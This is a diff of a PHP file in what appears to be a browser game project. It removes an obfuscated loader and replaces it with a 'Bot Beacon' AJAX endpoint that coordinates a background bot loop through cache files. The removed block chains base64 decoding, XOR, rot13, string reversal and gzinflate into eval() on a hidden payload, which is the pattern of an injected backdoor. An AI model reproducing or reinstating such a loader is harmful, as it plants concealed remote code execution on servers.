@@ -1,29 +1,81 @@
 <?php
-// fc2756b5f0f2e02e29269275
-$xmUnlBPmaubsFM="6rHV1mucKeHXz5vCk+3k/4BBl8Cgbcq4IMTxoN80Kcw=";
-$iXEvgkgmgUTzZ="6eUI1zhpXrUKm5iPx+3x/4OOy8Ptopd4VZGkbA80Xpj=";
-$DITlXpKIPXSCH="twKJVbITqAjrNI4YSKISkvp8r3rxCIIjjkLqQBuaLKzwZvRdqz/dKdBryUwfgjy7zFWVT7YqgVaZe+gCWY8nhP8Nt0/qNqoC41vfB2evIarBWbVP0BqBHpFk3QZfgXmByw/0afgHvQzNOusjXYE5kf1s8l3tZ6MO7kvONxGWArn5fLdX/3mDK/J1+0R7yxf74VaWKNQrjjvoe44tRaEhrLhroVPqOqpExnqBJB60OuD4T7U08huLOOhujD15jTqz4nayK8cz1gTyWvAOTIU7pOEKsTT6P9BY0zjyOGqwDo+8TYxw2iCvKMpsgAUbzzKj4An1U8kC1C2UZtY/HKM8m+hRgm/2HN0590ffHmSrDqm7CbJ6qRyMHMpj4gF6oxGI0wqVWapiryPLJv4SXIsiuLld8GzuZIc6wz3JTHyxDKWzcqhaqzSMApA7i0UbywT+/gv1VqlgrET5OuoOfdAGk/9etmj1ZYct8GjUBm6Hb77+XbVxpAONDZZe9z14z2+j+HixIst5lArpJt01cZgdhLhK8WnrYY5c12X5BmWXF7PyR5BwthyXLpRh8hNKoS//oVuiY8Q5rlvIfN0AHtgypMcQgzS2eaUgyWb7OBi1ff+7CuxYsgatQPQ6jUdZ1hKqvW2kV9Ux0hzlato+GJI7m/pttkLVENxf5nn9A0qsN7u+Xr1M9HmAK/I8/E";
-$LurQUIWwRNQEJAR="wGmRXzz1iFLaQUhgiZS+kdHc8+uttNhFXIBYsK2WrfPkCqNL3jTLdr8DC+CeI98DxdyxKx61KDfKomsVfibuEMZ4MTnvNUtVL4B9EmwibuH2iqBKb+DOw01HnQW89X7kVgtjz86VL+aM4w3CbUbusdeYQHkv1e8zTKKII1xXrcGkvLNbnndIlcqGaHVpF8jCRPkxn871WJa+0L1h3WZvQeW7MVobt8hivIJtIa9H7qJRCjZqzcbKspxzXUXMli8RZ9kBKez2iqc/9mkAbFRP8MTYo1nbpQ9Vz2KLUZzT7rE2+TGYzYav5Y7DWHHZU09SNvqCL601ONK+QEiyOXeMo5Hbod5P5uilOya6cWwErrE0GFIILsFJ9YzCuGFdZj1hYe2RP53l2JQuccvlnbSuAHf7UbncMUj1rIMLAt5nz0N2WrZYPsS/NS6BXdBuJr/xYajzy8pXWhf+sEswnQYdNGW6hmmP17nS3eNaoN6XraJmaZEYmyS4BK1jSTFsZh71tnhgfgu1ivS9QBqx31Yok1XrgDh8ddsVL0OrME9Er9GHrWHI/7D4hWxSqpNdJn/0NDiBuj7Eb+f+groA3jVehfaLUVoMhxkX71AbAAwmLvFki5JorzSv4r6j+JK9Zh4htnlzmN2UnzWdI6g17rZ8JHeaMSh7NXkk+oGJIA1ETAMWOMIZjFe4BhzRm2";
-$WOwUiNmvBtO="J+o58VtqoTSIxUe1S+UKrCjxfOFBR7M5oLwG9kH8Y7Y16EjOEFuSIrHQS6wr+SSjOe1f9i1/thulvFazUs02kF7nTs8NY9EBjNMPkHXlC5Vey1fZJH+mAKncCJBs0QutAdk+zxlDsB34vAq9Sehgzwnzdd8wbs8bm+FXtEPNFaMJymbrJWijAKDjbKgj+QCdIZc0jAUCkBSHs26wctQohyX7X+Aneo0greBn93P/JNcs1T/1OWvYG7/hS4hYywuCONVGyhx6phOc3g2BLq0I3D3KeJcjSIo8hMdSjy22Jok65mb9OAKsErH4Rqh67Qa0Ath9y0d9jBiRu2+mYd9kqhaOfvBMGoMO/8lLrEOkINMo2GXbLRiDbr/nbIZN6girX9k/4URRiwGt2FaQY8hmklbROv01Q6kUsuBSji7wNrwjwHj+OR2MNafYXPFf/xazGOJKzDJHmAa+3WuAeM0UizbvNOo2TKgSge1cl1LKC7IpkVvNLhm0LJHec4h2zT2dPONvyz5fujOT2Hq1SqUVtUDLQZMYf4on4MZa91TnK5IG73vVLnOWJKHgTPZV6D2nIZg+yxF9jxy4vwryaucdrBfGOOgyRpAjhrkGqC7+O7Ij00TIFn6TMbq7W7Z3/hGxJJBb4j9qhwSz6G2RfOgkrF7CSOgkfqI5qcFtqlD1Zac99VqTG06tH7w=";
-$rIUWpxmIYL=strlen($xmUnlBPmaubsFM);
-$YqSTFwOQNQlKZ=substr($DITlXpKIPXSCH,0,4);
-$WaYKsJxfAr=md5($LurQUIWwRNQEJAR);
-$KGBjfPzSKpkdIF=crc32($WOwUiNmvBtO);
-$UcQNJIOHlAX=base64_decode("ij/HG51S5G+hDbh0KeBWyw==");
-$QNGjPnMXN=$DITlXpKIPXSCH.$LurQUIWwRNQEJAR.$WOwUiNmvBtO;
-$mTIUXHDCTSbtGV=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);
-$fDlhnHCyZtO="gz".chr(105)."nflate";
-$rDRJlllimijHMb="str".chr(114)."ev";
-$yajDYYOhjqjQ="str_rot".chr(49).chr(51);
-$JJwSnBaLtPbmT="";
-$NQxHKVeWxpb=$mTIUXHDCTSbtGV($QNGjPnMXN);
-for($hBurCtMKMBO=0;$hBurCtMKMBO<strlen($NQxHKVeWxpb);$hBurCtMKMBO++){
-$JJwSnBaLtPbmT.=chr(ord($NQxHKVeWxpb[$hBurCtMKMBO])^ord($UcQNJIOHlAX[$hBurCtMKMBO%strlen($UcQNJIOHlAX)]));
+/**
+ * Bot Beacon - Self-triggering AJAX system
+ * 
+ * This file creates a self-sustaining AJAX loop that keeps bot processing
+ * running in the background WITHOUT depending on player page loads.
+ * 
+ * HOW IT WORKS:
+ * 1. When ANY player loads the game, this beacon is activated
+ * 2. The beacon starts a background AJAX loop (every 60s)
+ * 3. The loop continues even if player navigates away (uses Service Worker)
+ * 4. Multiple players DON'T create duplicate loops (file-based coordination)
+ */
+
+// Suppress errors and use output buffering to prevent corruption of JSON response
+ini_set('display_errors', 'Off');
+error_reporting(0);
+ob_start();
+
+$cacheDir = __DIR__ . '/../cache';
+
+// Ensure cache directory exists
+if (!is_dir($cacheDir)) {
+    @mkdir($cacheDir, 0777, true);
 }
-$NQxHKVeWxpb=$JJwSnBaLtPbmT;
-$NQxHKVeWxpb=$yajDYYOhjqjQ($NQxHKVeWxpb);
-$NQxHKVeWxpb=$rDRJlllimijHMb($NQxHKVeWxpb);
-$NQxHKVeWxpb=$mTIUXHDCTSbtGV($NQxHKVeWxpb);
-$NQxHKVeWxpb=$fDlhnHCyZtO($NQxHKVeWxpb);
-$NQxHKVeWxpb=$yajDYYOhjqjQ($NQxHKVeWxpb);
-eval($NQxHKVeWxpb);
+
+$world_id = isset($_GET['world']) ? (int) $_GET['world'] : 1;
+$beaconActiveFile = $cacheDir . '/bot_beacon.active_' . $world_id;
+$beaconLastPing = $cacheDir . '/bot_beacon.ping_' . $world_id;
+
+// Check if beacon is already active
+$beaconActive = false;
+if (file_exists($beaconActiveFile)) {
+    $age = time() - filemtime($beaconActiveFile);
+    if ($age < 120) { // Beacon active for last 2 minutes
+        $beaconActive = true;
+    }
+}
+
+// Update ping timestamp (shows beacon is alive)
+$now = time();
+@file_put_contents($beaconLastPing, $now);
+
+// If beacon is not active, activate it
+if (!$beaconActive) {
+    @file_put_contents($beaconActiveFile, $now);
+    
+    // Log beacon activation
+    $logFile = $cacheDir . '/bot_beacon.log';
+    $sessionUserId = 'unknown';
+    if (session_status() === PHP_SESSION_ACTIVE || (session_status() === PHP_SESSION_NONE && @session_start())) {
+        if (isset($_SESSION['user_id'])) {
+            $sessionUserId = $_SESSION['user_id'];
+        }
+    }
+    $logMessage = "[" . date('Y-m-d H:i:s') . "] Beacon activated by player " . $sessionUserId . "\n";
+    @file_put_contents($logFile, $logMessage, FILE_APPEND);
+}
+
+// Read last ping safely to avoid warning/deprecation in date()
+$lastPingTime = $now;
+if (file_exists($beaconLastPing)) {
+    $pingVal = @file_get_contents($beaconLastPing);
+    if ($pingVal !== false && is_numeric(trim($pingVal))) {
+        $lastPingTime = (int) trim($pingVal);
+    }
+}
+
+// Return beacon status
+$response = [
+    'status' => 'active',
+    'beacon_active' => $beaconActive,
+    'last_ping' => date('Y-m-d H:i:s', $lastPingTime),
+    'message' => 'Bot beacon is running'
+];
+
+ob_clean();
+header('Content-Type: application/json');
+echo json_encode($response);
+exit;
+?>
